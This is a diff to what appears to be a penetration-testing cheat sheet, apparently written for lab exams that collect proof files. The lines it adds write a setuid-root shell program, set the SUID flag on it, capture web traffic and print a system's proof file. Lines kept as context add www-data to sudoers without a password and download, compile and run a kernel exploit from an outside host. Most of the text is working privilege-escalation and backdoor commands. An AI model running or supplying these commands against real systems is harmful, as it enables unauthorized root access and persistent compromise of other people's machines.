@@ -109,6 +109,9 @@ $ gcc -m64 -o output hello.c # (64 bit)*
 
 Manual testing
 
+    Use netstat to find other machines connected
+    *$ netstat -ano*
+
     Command to skip ignored lines in config files
     *$ alias nonempty="egrep -v '^[ \t]*#|^$'"*
 
@@ -182,6 +185,12 @@ It works*
 setresuid(0, 0, 0);
 system("/bin/bash");
 }*
+    Without interactive shell
+    *$ echo -e '#include <stdio.h>\n#include <sys/types.h>\n#include <unistd.h>\n\nint main(void){\n\tsetuid(0);\n\tsetgid(0);\n\tsystem("/bin/bash");\n}' > setuid.c*
+
+    If you can get root to execute anything, the following will change a binary owner to him and set the SUID flag:
+    *$ chown root:root /tmp/setuid;chmod 4777 /tmp/setuid;*
+
 
     Add user www-data to sudoers with no password
     *$ echo 'chmod 777 /etc/sudoers && echo "www-data ALL=NOPASSWD:ALL" >> /etc/sudoers && chmod 440 /etc/sudoers' > /tmp/update*
@@ -209,6 +218,9 @@ except:
     Ring0 kernel exploit for 2.3/2.4
     *wget http://downloads.securityfocus.com/vulnerabilities/exploits/36038-6.c; gcc 36038-6.c -m32 -o ring0; chmod +x ring0; ./ring0*
 
+    Inspect web traffic
+    *$ tcpdump tcp port 80 -w output.pcap -i eth0*
+
 Open an xterm remotely
     First, run an xserver in your machine
     *$ Xnest :1*
@@ -216,3 +228,6 @@ Open an xterm remotely
     *$ xterm -display 127.0.0.1:1*
     Finally, run the follwing in the remote machine:
     *$ /usr/openwin/bin/xterm -display yourip:1*
+
+Get proof
+    *$ echo " ";echo "uname -a:";uname -a;echo " ";echo "hostname:";hostname;echo " ";echo "id";id;echo " ";echo "ifconfig:";/sbin/ifconfig -a;echo " ";echo "proof:";cat /root/proof.txt 2>/dev/null; cat /Desktop/proof.txt 2>/dev/null;echo " "*
